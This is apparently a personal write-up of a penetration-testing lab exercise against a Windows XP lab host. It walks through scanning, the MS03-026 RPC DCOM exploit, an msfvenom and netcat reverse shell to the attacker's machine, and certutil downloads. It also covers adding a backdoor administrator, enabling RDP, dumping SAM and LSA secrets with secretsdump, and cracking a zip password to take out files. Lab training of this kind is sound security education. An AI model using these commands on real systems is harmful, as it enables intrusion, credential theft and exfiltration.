```powershell
steps:

-> nmap -Pn -sV -sC 10.11.1.5  

-->  crackmapexec smb 10.11.1.5 -u '' -p '' 

---> found  exploit # Microsoft Windows XP/2000 - 'RPC DCOM' Remote (MS03-026)

---> attempted to throw up reverse shell using cert util and hosting http server - it failed

----> got system info and began hosting impacket-smbserver kali . for file xfer

----> copied windows binaries and netcat to working directory on kali machine to transfer over to windows machine

----> once nc.exe and whoami were on the box through smb, was able to make a reverse shell and connect into it

-----> enabled rdp on user

-----> dumped secretsdump once rdp was enabled.

------> zip2john to crack bankaccount.zip, and got creds alice to unzip

------> unzipped bank-account.zip with alice creds and got new creds 
bob@acme.localcmailto:3v1lp@ss

--------> Got proof.txt ed20b785808f615be2c588ed925b18ce 

```
```shell
# nmap

19:48 - 01Mar2023

┌──(root㉿kali)-[/home/kali]
└─# nmap -Pn -sV -sC 10.11.1.5    
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-01 20:48 EST
Nmap scan report for 10.11.1.5
Host is up (0.062s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Microsoft Windows XP microsoft-ds
1025/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: -1s
|_smb2-time: Protocol negotiation failed (SMB2)
|_nbstat: NetBIOS name: ALICE, NetBIOS user: <unknown>, NetBIOS MAC: 005056865e87 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.58 seconds

```

```shell

# new user Alice, windows machine 5.1
# domain thinc.local
16:11
┌──(root㉿kali)-[/home/kali]
└─# crackmapexec smb 10.11.1.5 -u '' -p ''                            
SMB         10.11.1.5       445    ALICE            [*] Windows 5.1 (name:ALICE) (domain:thinc.local) (signing:False) (SMBv1:True)
SMB         10.11.1.5       445    ALICE            [-] thinc.local\: STATUS_ACCESS_DENIED 
```

```shell
# 1st exploit ms03-026
18:47
# 1st exploit
# exploit # Microsoft Windows XP/2000 - 'RPC DCOM' Remote (MS03-026)
https://www.exploit-db.com/exploits/66

┌──(root㉿kali)-[/home/kali/Documents/offsec_labs/10.11.1.5]
└─# ./ms03-026 6 10.11.1.5
---------------------------------------------------------
- Remote DCOM RPC Buffer Overflow Exploit
- Original code by FlashSky and Benjurry
- Rewritten by HDM <hdm [at] metasploit.com>
- Using return address of 0x77e626ba
- Connect: Connection refused
                                                                                                                     
┌──(root㉿kali)-[/home/kali/Documents/offsec_labs/10.11.1.5]
└─# ./ms03-026 6 10.11.1.5
---------------------------------------------------------
- Remote DCOM RPC Buffer Overflow Exploit
- Original code by FlashSky and Benjurry
- Rewritten by HDM <hdm [at] metasploit.com>
- Using return address of 0x77e626ba
- Dropping to System Shell...

Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>

# on as system throwing up reverse shell

```

```shell
# creating reverse shell
msfvenom -p windows/shell/reverse_tcp LHOST=tun0 LPORT=3232 -f exe > prompt.exe

# hosting python server
┌──(root㉿kali)-[/home/kali/Documents/offsec_labs/10.11.1.5]
└─# ls -la | grep prompt                                      
-rw-r--r--  1 root root  73802 Mar  2 20:02 prompt.exe

┌──(root㉿kali)-[/home/kali/Documents/offsec_labs/10.11.1.5]
└─# python3 -m http.server 80                                 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...



# transferring prompt.exe
certutil -urlcache -f http://192.168.119.147:80/prompt.exe


#systeminfo

C:\WINDOWS>systeminfo
systeminfo

Host Name:                 ALICE
OS Name:                   Microsoft Windows XP Professional
OS Version:                5.1.2600 Service Pack 1 Build 2600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Member Workstation
OS Build Type:             Uniprocessor Free
Registered Owner:          Offsec
Registered Organization:   Offsec
Product ID:                55274-640-9771731-23056
Original Install Date:     1/10/2007, 5:49:26 PM
System Up Time:            0 Days, 0 Hours, 9 Minutes, 43 Seconds
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x86 Family 23 Model 1 Stepping 2 AuthenticAMD ~3093 Mhz
BIOS Version:              INTEL  - 6040000
Windows Directory:         C:\WINDOWS
System Directory:          C:\WINDOWS\System32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (GMT) Greenwich Mean Time : Dublin, Edinburgh, Lisbon, London
Total Physical Memory:     511 MB
Available Physical Memory: 407 MB
Virtual Memory: Max Size:  1,378 MB
Virtual Memory: Available: 1,204 MB
Virtual Memory: In Use:    174 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    thinc.local
Logon Server:              N/A
Hotfix(s):                 3 Hotfix(s) Installed.
                           [01]: File 1
                           [02]: Q147222
                           [03]: KB893803v2 - Update
NetWork Card(s):           1 NIC(s) Installed.
                           [01]: VMware PCI Ethernet Adapter
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.11.1.5
```


```shell
#due to the first exploit being a buffer overflow we dont really have any access to running commands, going to try 2nd exploit
```

```shell
# hosting smb server on my own box

──(root㉿kali)-[/home/kali/Documents/offsec_labs/10.11.1.5]
└─# impacket-smbserver kali .
Impacket v0.10.1.dev1+20230223.202738.f4b848fa - Copyright 2022 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.11.1.5,1212)
[*] AUTHENTICATE_MESSAGE (\,ALICE)
[*] User ALICE\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa
[*] NetrShareEnum Level: 1
[*] NetrServerGetInfo Level: 101
[*] Closing down connection (10.11.1.5,1212)
[*] Remaining connections []

# viewing that the share is accessible from the victim machine
C:\WINDOWS\Tasks>net view \\192.168.119.147
net view \\192.168.119.147
Shared resources at \\192.168.119.147

(null)

Share name  Type  Used as  Comment  

-------------------------------------------------------------------------------
KALI        Disk                    
The command completed successfully.


# connected to share drive of kali box
C:\WINDOWS\Tasks>net use * \\192.168.119.147\kali
net use * \\192.168.119.147\kali
Drive Z: is now connected to \\192.168.119.147\kali.

The command completed successfully.




```

```shell
# copied windows binaries and netcat to working directory on kali machine to transfer over to windows machine

┌──(root㉿kali)-[/home/kali/Documents/offsec_labs/10.11.1.5]
└─# cp -r /usr/share/windows-binaries/whoami.exe /usr/share/windows-binaries/nc.exe .

┌──(root㉿kali)-[/home/kali/Documents/offsec_labs/10.11.1.5]
└─# ls
295.c  66.c  impacket  ms03-026  ms04-011.exe  nc.exe  prompt.exe  __pycache__  whoami.exe

19:22
# syntax used to copy items from smb server to victim machine while being on the victim machine.
C:\WINDOWS\Tasks>copy Z:\whoami.exe
copy Z:\whoami.exe
        1 file(s) copied.

C:\WINDOWS\Tasks>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 50C3-3741

 Directory of C:\WINDOWS\Tasks

03/03/2023  01:19 AM            59,392 nc.exe
03/03/2023  01:19 AM            66,560 whoami.exe
               2 File(s)        125,952 bytes
               0 Dir(s)   1,618,747,392 bytes free

C:\WINDOWS\Tasks>

```

```shell
#once nc.exe and whoami were on the box through smb, was able to make a reverse shell and connect into it

# reverse shell being hosted on victim machine
C:\WINDOWS\Tasks>.\nc.exe 192.168.119.147 4444 -e cmd
.\nc.exe 192.168.119.147 4444 -e cmd

# reverse shell being caught
┌──(root㉿kali)-[/home/kali/Documents/offsec_labs/10.11.1.5]
└─# nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.119.147] from (UNKNOWN) [10.11.1.5] 1231
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\Tasks>whoami
whoami
NT AUTHORITY\SYSTEM

C:\WINDOWS\Tasks>

# A LITTLE BONUS, USING THE SET COMMAND BELOW WE ARE NOW ABLE TO EXECUTE COMMANDS FROM WITHIN THE C:\WINDOWS\TASKS DIRECTORY IN ANY DIRECTORY.
C:\WINDOWS\Tasks>set PATH=%PATH%;C:\WINDOWS\TASKS
set PATH=%PATH%;C:\WINDOWS\TASKS

C:\WINDOWS\Tasks>CD ..
CD ..

C:\WINDOWS>whoami
whoami
NT AUTHORITY\SYSTEM

C:\WINDOWS>


#how to copy bank account.zip over back to our kali machine using the hosted smb server from earlier
C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 50C3-3741

 Directory of C:\

01/10/2007  05:47 PM                 0 AUTOEXEC.BAT
01/11/2007  01:07 PM             2,081 bank-account.zip
01/10/2007  05:47 PM                 0 CONFIG.SYS
12/20/2007  07:12 PM    <DIR>          Documents and Settings
12/27/2012  03:53 AM    <DIR>          Program Files
01/17/2018  10:18 AM    <DIR>          WINDOWS
               3 File(s)          2,081 bytes
               3 Dir(s)   1,618,612,224 bytes free

C:\>copy C:\bank-account.zip Z:\loot
copy C:\bank-account.zip Z:\loot
        1 file(s) copied.

C:\>

# back on kali machine but we need a password
┌──(root㉿kali)-[/home/…/Documents/offsec_labs/10.11.1.5/loot]
└─# unzip bank-account.zip     
Archive:  bank-account.zip
[bank-account.zip] bank-account.xls password: 

# going to enable rdp on user

# adding user
net user jorden password /add

# adding user to administrators group
net localgroup Administrators jorden /add

# adding added user to Remote Desktop users group
net localgroup "Remote Desktop Users" jorden /add

#adding registry key
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

#running impacket-secretsdump, note that you need to do the previous rdp user steps in order to run secrets dump

┌──(root㉿kali)-[/home/…/Documents/offsec_labs/10.11.1.5/loot]
└─# impacket-secretsdump jorden:password@10.11.1.5 -outputfile hashes
Impacket v0.10.1.dev1+20230223.202738.f4b848fa - Copyright 2022 Fortra

[*] Target system bootKey: 0x9cdfb1caf527c0ebdce1dc4677aefd96
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a8c8b7a37513b7eb9308952b814b522b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HelpAssistant:1000:05fa67eaec4d789ec4bd52f48e5a6b28:2733cdb0d8a1fec3f976f3b8ad1deeef:::
SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:0f7a50dd4b95cec4c1dea566f820f4e7:::
alice:1004:aad3b435b51404eeaad3b435b51404ee:b74242f37e47371aff835a6ebcac4ffe:::
jorden:1007:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
THINC\ALICE$:aes256-cts-hmac-sha1-96:3a61c169daff3ee964f16ea3d5a5a4e0d935c5cf7adf4a6632e40b239940d3dc
THINC\ALICE$:aes128-cts-hmac-sha1-96:3fcef29afc2aba03a82c9705a9b17155
THINC\ALICE$:des-cbc-md5:baea98d0cdf4fd8c
THINC\ALICE$:plain_password_hex:0f6ffb25902098cd2b3e8890856545f0e2ba142f427762e0e91c5084
THINC\ALICE$:aad3b435b51404eeaad3b435b51404ee:3d9d86b905e39b1a0492d8ef88d7691c:::
[*] 0083343a-f925-4ed7-b1d6-d95d17a0b57b-RemoteDesktopHelpAssistantAccount 
 0000   30 00 75 00 2B 00 30 00  45 00 6F 00 34 00 42 00   0.u.+.0.E.o.4.B.
 0010   30 00 64 00 6E 00 50 00  62 00 4A 00 00 00         0.d.n.P.b.J...
0083343a-f925-4ed7-b1d6-d95d17a0b57b-RemoteDesktopHelpAssistantAccount:300075002b00300045006f0034004200300064006e00500062004a000000
[*] 0083343a-f925-4ed7-b1d6-d95d17a0b57b-RemoteDesktopHelpAssistantSID 
 0000   01 05 00 00 00 00 00 05  15 00 00 00 2E 43 AC 40   .............C.@
 0010   23 F3 F6 63 43 17 0A 32  E8 03 00 00               #..cC..2....
0083343a-f925-4ed7-b1d6-d95d17a0b57b-RemoteDesktopHelpAssistantSID:0105000000000005150000002e43ac4023f3f66343170a32e8030000
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x35968cb51423b892acf7367bb016006e025c30f0
dpapi_userkey:0xb0215468a632887a1b0ea0a70aecc5d767b05c40
[*] G${ED8F4747-E13D-47bc-856B-5CEFE1A81A7F} 
 0000   82 98 A3 E9 59 27 1F 48  8E 1C FC 45 AB AF E8 09   ....Y'.H...E....
G${ED8F4747-E13D-47bc-856B-5CEFE1A81A7F}:8298a3e959271f488e1cfc45abafe809
[*] L$HYDRAENCKEY_28ada6da-d622-11d1-9cb9-00c04fb16e75 
 0000   52 53 41 32 48 00 00 00  00 02 00 00 3F 00 00 00   RSA2H.......?...
 0010   01 00 01 00 9B 84 B0 E3  29 01 23 48 A6 B5 9C 2A   ........).#H...*
 0020   87 9F DF 4F 37 98 4F 7B  0A FE FB EE D0 1A EF 3E   ...O7.O{.......>
 0030   8F EE 18 CA AA 11 C5 AA  C6 37 E6 A5 B3 F0 E9 C5   .........7......
 0040   AD 52 A5 DC 1F 46 FB 44  DB 33 FE 5D 6A 2F 08 15   .R...F.D.3.]j/..
 0050   41 E1 B0 D5 00 00 00 00  00 00 00 00 A5 5E AB 45   A............^.E
 0060   BC CA E5 CE FF F5 35 24  6E FE F2 89 A7 C4 F0 C0   ......5$n.......
 0070   1C A0 AE 3B 7F 73 F4 9D  4B D5 68 F5 00 00 00 00   ...;.s..K.h.....
 0080   3F 32 68 17 92 E2 11 9B  08 1E 99 88 3B 49 05 55   ?2h.........;I.U
 0090   25 DD 94 45 6B 6C A6 AA  86 2D A4 61 99 A2 E9 DE   %..Ekl...-.a....
 00a0   00 00 00 00 DD C9 5A 31  66 FC 67 2F CD 8B B9 11   ......Z1f.g/....
 00b0   81 DE 72 EC 54 48 F9 7F  8A 89 C3 36 98 0A BF 9C   ..r.TH.....6....
 00c0   EB F5 ED 49 00 00 00 00  33 B7 31 2C E2 A4 DB 51   ...I....3.1,...Q
 00d0   7D F3 42 AE 30 24 49 04  5E 66 1B 2E 41 9F C2 E8   }.B.0$I.^f..A...
 00e0   40 72 42 97 F5 47 9F 18  00 00 00 00 E6 EA D7 30   @rB..G.........0
 00f0   1D D3 90 9A 22 99 07 6B  AB 1B 83 D2 85 61 3A 0D   ...."..k.....a:.
 0100   59 64 8B 0C 3B E4 00 E2  B9 F2 13 39 00 00 00 00   Yd..;......9....
 0110   A1 AD FD A7 09 88 DE 1C  35 58 C3 09 E0 55 5C 95   ........5X...U\.
 0120   FD 30 CC F6 A9 4A 9D 6B  B8 9D 72 64 55 90 4A A0   .0...J.k..rdU.J.
 0130   E9 E4 2C CD A9 48 83 35  93 99 43 56 69 53 AA 69   ..,..H.5..CViS.i
 0140   DE 32 4E 36 14 69 3A CA  53 83 12 EC 2E 01 31 36   .2N6.i:.S.....16
 0150   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
 0160   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
 0170   00 00 00 00 00 00 00 00  00 00 00 00               ............
L$HYDRAENCKEY_28ada6da-d622-11d1-9cb9-00c04fb16e75:5253413248000000000200003f000000010001009b84b0e329012348a6b59c2a879fdf4f37984f7b0afefbeed01aef3e8fee18caaa11c5aac637e6a5b3f0e9c5ad52a5dc1f46fb44db33fe5d6a2f081541e1b0d50000000000000000a55eab45bccae5cefff535246efef289a7c4f0c01ca0ae3b7f73f49d4bd568f5000000003f32681792e2119b081e99883b49055525dd94456b6ca6aa862da46199a2e9de00000000ddc95a3166fc672fcd8bb91181de72ec5448f97f8a89c336980abf9cebf5ed490000000033b7312ce2a4db517df342ae302449045e661b2e419fc2e840724297f5479f1800000000e6ead7301dd3909a2299076bab1b83d285613a0d59648b0c3be400e2b9f2133900000000a1adfda70988de1c3558c309e0555c95fd30ccf6a94a9d6bb89d726455904aa0e9e42ccda9488335939943566953aa69de324e3614693aca538312ec2e0131360000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
[*] L$RTMTIMEBOMB_1320153D-8DA3-4e8e-B27B-0D888223A588 
 0000   00 92 50 34 0A 93 C7 01                            ..P4....
L$RTMTIMEBOMB_1320153D-8DA3-4e8e-B27B-0D888223A588:009250340a93c701
[*] L${6B3E6424-AF3E-4bff-ACB6-DA535F0DDC0A} 
 0000   AD 91 7D F1 EF 3F CC DC  0F 09 AE 0D DE DB 18 31   ..}..?.........1
 0010   B8 3D B5 A3 E6 44 4D 57  03 EB 82 5C 4E 94 32 36   .=...DMW...\N.26
 0020   09 1A 61 B2 2B 17 11 AA  18 F6 F5 8B E9 50 14 AE   ..a.+........P..
 0030   19 DC 79 E7 00 E9 07 31                            ..y....1
L${6B3E6424-AF3E-4bff-ACB6-DA535F0DDC0A}:ad917df1ef3fccdc0f09ae0ddedb1831b83db5a3e6444d5703eb825c4e943236091a61b22b1711aa18f6f58be95014ae19dc79e700e90731
[*] NL$KM 
 0000   55 0B 67 65 AF 5F 56 CA  36 5A B5 2B 98 07 33 20   U.ge._V.6Z.+..3 
 0010   C1 40 5C EE 6C A8 22 B5  99 D7 24 9F 64 D9 C8 C4   .@\.l."...$.d...
 0020   D1 43 ED 7C CA 89 05 22  CE 19 BF 71 D8 A6 2C E7   .C.|..."...q..,.
 0030   78 81 65 A8 16 92 CC C6  4A 2B 5F 52 96 0A 5F 2E   x.e.....J+_R.._.
NL$KM:550b6765af5f56ca365ab52b98073320c1405cee6ca822b599d7249f64d9c8c4d143ed7cca890522ce19bf71d8a62ce7788165a81692ccc64a2b5f52960a5f2e
[*] Cleaning up... 

```
```shell
#zip2john to crack bankaccount.zip
# &
# john to break the zip file password.

#zip2john file
┌──(root㉿kali)-[/home/…/Documents/offsec_labs/10.11.1.5/loot]
└─# zip2john bank-account.zip > zip.txt
ver 2.0 bank-account.zip/bank-account.xls PKZIP Encr: cmplen=1951, decmplen=17920, crc=924286A6 ts=785A cs=9242 type=8

┌──(root㉿kali)-[/home/…/Documents/offsec_labs/10.11.1.5/loot]
└─# ls
bank-account.zip  hashes.sam  hashes.secrets  zip.txt


#john command to break bank account.xls file
┌──(root㉿kali)-[/home/…/Documents/offsec_labs/10.11.1.5/loot]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt zip.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alice            (bank-account.zip/bank-account.xls)     
1g 0:00:00:00 DONE (2023-03-02 21:07) 100.0g/s 819200p/s 819200c/s 819200C/s 123456..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

```shell
20:12
#unzipped bank-account.zip with new creds from above.


┌──(root㉿kali)-[/home/…/Documents/offsec_labs/10.11.1.5/loot]
└─# unzip bank-account.zip
Archive:  bank-account.zip
[bank-account.zip] bank-account.xls password: 
  inflating: bank-account.xls        
                                                                                                                                                                                                                                             
┌──(root㉿kali)-[/home/…/Documents/offsec_labs/10.11.1.5/loot]
└─# ls
bank-account.xls  bank-account.zip  hashes.sam  hashes.secrets  zip.txt

#ran cat and got image below with new creds
 ┌──(root㉿kali)-[/home/…/Documents/offsec_labs/10.11.1.5/loot]
└─# cat bank-account.xls


new creds: bob@acme.localcmailto:3v1lp@ss
```
![[10.11.1.5 bob creds.png]]


```shell
# proof.txt
20:15
C:\Documents and Settings\Administrator\Desktop>type proof.txt
type proof.txt
ed20b785808f615be2c588ed925b18ce 


![[Pasted image 20230302201555.png]]
```


```shell


